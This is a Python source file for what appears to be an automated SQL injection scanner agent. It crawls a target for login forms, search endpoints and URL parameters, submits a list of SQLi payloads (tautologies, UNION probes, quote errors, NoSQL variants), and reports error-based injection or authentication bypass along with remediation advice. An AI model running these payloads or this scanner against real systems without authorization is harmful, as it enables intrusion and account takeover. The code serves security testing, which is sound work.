from .base import BaseAgent
from playwright.async_api import async_playwright
import aiohttp
import urllib.parse
import asyncio

class SQLiAgent(BaseAgent):
    """
    SQL Injection scanner.
    
    Strategy:
    1. Crawl the target for forms (login, search, registration)
    2. Fuzz each form input with SQLi payloads via POST and GET
    3. Also probe common API endpoints with injected params
    4. Detect SQL error messages OR auth bypass (login success with injected creds)
    """

    PAYLOADS = [
        # Classic
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "admin'--",
        "' OR 1=1--",
        "\" OR 1=1--",
        "' OR ''='",
        "1' OR '1'='1' -- -",
        # Union-based
        "' UNION SELECT null--",
        "' UNION SELECT null,null--",
        "' UNION SELECT null,null,null--",
        # Error-based
        "'",
        "\"",
        "1'",
        "1\"",
        # NoSQL
        "' || '1'=='1",
        "admin' || ''=='",
    ]

    SQL_ERROR_SIGNATURES = [
        "syntax error", "mysql", "postgres", "sqlite", "sql",
        "unclosed quotation", "quoted string not properly terminated",
        "you have an error in your sql syntax",
        "ora-", "db2", "odbc", "jdbc",
        "sqlexception", "microsoft sql",
        "unterminated string", "unrecognized token",
    ]

    async def execute(self):
        await self.emit_event("INFO", f"Starting SQL Injection Hunter on {self.target_url}")
        found_sqli = False

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            page = await browser.new_page()

            try:
                await page.goto(self.target_url, wait_until="domcontentloaded", timeout=15000)
                await self.update_progress(10)

                # ===== Phase 1: Find and test login forms =====
                await self.emit_event("INFO", "Phase 1: Hunting for login forms...")
                
                # Try common login paths
                login_paths = ["/#/login", "/login", "/signin", "/auth/login", "/account/login", "/api/login"]
                
                for path in login_paths:
                    try:
                        test_url = self.target_url.rstrip("/") + path
                        await page.goto(test_url, wait_until="domcontentloaded", timeout=10000)
                        await asyncio.sleep(1)  # Let SPA render

                        # Look for email/username + password fields
                        email_input = await page.query_selector("input[type='email'], input[name='email'], input[id='email'], input[name='username'], input[id='loginUsername']")
                        password_input = await page.query_selector("input[type='password']")

                        if email_input and password_input:
                            await self.emit_event("INFO", f"Login form found at {path}! Testing SQLi payloads...")

                            for payload in self.PAYLOADS[:8]:  # Top 8 payloads
                                try:
                                    self.clear_steps()
                                    self.step(f"Navigate to {path}", f"Found login form with email and password fields")
                                    self.step(f"Fill email field with: {payload}", "Payload entered into email/username input")
                                    self.step(f"Fill password field with: anything", "Dummy password entered")
                                    await email_input.fill(payload)
                                    await password_input.fill("anything")
                                    
                                    # Find submit button
                                    submit = await page.query_selector("button[type='submit'], button[id='loginButton'], input[type='submit'], button:has-text('Login'), button:has-text('Sign in'), button:has-text('Log in')")
                                    if submit:
                                        # Listen for responses
                                        response_promise = page.wait_for_response(
                                            lambda resp: "/login" in resp.url or "/auth" in resp.url or "/rest/user" in resp.url,
                                            timeout=5000
                                        )
                                        await submit.click()
                                        
                                        try:
                                            response = await response_promise
                                            body = await response.text()
                                            status = response.status

                                            # Check for SQL errors in response
                                            body_lower = body.lower()
                                            for sig in self.SQL_ERROR_SIGNATURES:
                                                if sig in body_lower:
                                                    self.step("Click submit button", f"POST request sent to login endpoint")
                                                    self.step(f"Analyze response (HTTP {status})", f"SQL error signature detected: '{sig}'. Response body: {body[:200]}")
                                                    await self.report_finding(
                                                        severity="CRITICAL",
                                                        title="SQL Injection — Error-Based (Login Form)",
                                                        evidence=f"Payload: {payload} at {path} triggered SQL error containing '{sig}'. Response ({status}): {body[:300]}",
                                                        recommendation="Use parameterized queries/prepared statements. Never concatenate user input into SQL strings."
                                                    )
                                                    found_sqli = True
                                                    break

                                            # Check for successful auth bypass (200 with token/auth data)
                                            if status == 200 and ("token" in body_lower or "authentication" in body_lower or "umail" in body_lower):
                                                self.step("Click submit button", f"POST request sent to login endpoint")
                                                self.step(f"Analyze response (HTTP {status})", f"Authentication BYPASSED — received auth token/session. Response: {body[:200]}")
                                                await self.report_finding(
                                                    severity="CRITICAL",
                                                    title="SQL Injection — Authentication Bypass",
                                                    evidence=f"Payload: {payload} at {path} returned 200 with auth token. Response: {body[:300]}",
                                                    recommendation="Use parameterized queries for all authentication logic. Never concatenate user input into SQL WHERE clauses."
                                                )
                                                found_sqli = True

                                        except:
                                            pass  # No matching response

                                    # Re-navigate to clear state
                                    await page.goto(test_url, wait_until="domcontentloaded", timeout=10000)
                                    await asyncio.sleep(0.5)
                                    email_input = await page.query_selector("input[type='email'], input[name='email'], input[id='email'], input[name='username'], input[id='loginUsername']")
                                    password_input = await page.query_selector("input[type='password']")
                                    if not email_input or not password_input:
                                        break

                                except Exception as e:
                                    continue

                            if found_sqli:
                                break
                    except:
                        continue

                await self.update_progress(50)

                # ===== Phase 2: Test search endpoints =====
                await self.emit_event("INFO", "Phase 2: Testing search endpoints for SQLi...")
                
                search_endpoints = [
                    "/rest/products/search?q=",
                    "/api/search?q=",
                    "/search?q=",
                    "/api/products?search=",
                ]

                async with aiohttp.ClientSession() as session:
                    for endpoint in search_endpoints:
                        for payload in self.PAYLOADS[:6]:
                            try:
                                url = self.target_url.rstrip("/") + endpoint + urllib.parse.quote(payload)
                                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                                    text = await resp.text()
                                    text_lower = text.lower()

                                    for sig in self.SQL_ERROR_SIGNATURES:
                                        if sig in text_lower:
                                            self.clear_steps()
                                            self.step(f"curl -s '{url}'", f"HTTP {resp.status} — Response contains SQL error signature")
                                            self.step(f"Grep for SQL error patterns", f"Found: '{sig}' in response body: {text[:150]}")
                                            await self.report_finding(
                                                severity="HIGH",
                                                title="SQL Injection — Error-Based (Search Endpoint)",
                                                evidence=f"Payload: {payload} at {endpoint} triggered SQL error: '{sig}'. Response: {text[:300]}",
                                                recommendation="Sanitize search inputs and use parameterized queries."
                                            )
                                            found_sqli = True
                                            break

                            except:
                                continue

                await self.update_progress(80)

                # ===== Phase 3: Test URL params if present =====
                parsed = urllib.parse.urlparse(self.target_url)
                params = urllib.parse.parse_qs(parsed.query)
                if params:
                    await self.emit_event("INFO", "Phase 3: Fuzzing URL parameters...")
                    async with aiohttp.ClientSession() as session:
                        for param, values in params.items():
                            for payload in self.PAYLOADS[:6]:
                                try:
                                    fuzzed_params = params.copy()
                                    fuzzed_params[param] = [payload]
                                    new_query = urllib.parse.urlencode(fuzzed_params, doseq=True)
                                    fuzzed_url = parsed._replace(query=new_query).geturl()

                                    async with session.get(fuzzed_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                                        text = await resp.text()
                                        text_lower = text.lower()
                                        for sig in self.SQL_ERROR_SIGNATURES:
                                            if sig in text_lower:
                                                self.clear_steps()
                                                self.step(f"curl -s '{fuzzed_url}'", f"HTTP {resp.status} — injected payload into '{param}' parameter")
                                                self.step(f"Analyze response for SQL errors", f"SQL error detected: '{sig}'")
                                                await self.report_finding(
                                                    severity="CRITICAL",
                                                    title="SQL Injection Detected (URL Parameter)",
                                                    evidence=f"Payload: {payload} on param: {param} triggered: '{sig}'",
                                                    recommendation="Use prepared statements (parameterized queries)."
                                                )
                                                found_sqli = True
                                                break
                                except:
                                    continue

                await self.update_progress(100)
                
                if found_sqli:
                    await self.emit_event("SUCCESS", "🚨 SQL Injection CONFIRMED!")
                else:
                    await self.emit_event("SUCCESS", "SQLi scan complete. No injections found.")

            except Exception as e:
                await self.emit_event("ERROR", f"SQLi scan error: {str(e)}")
            finally:
                await browser.close()
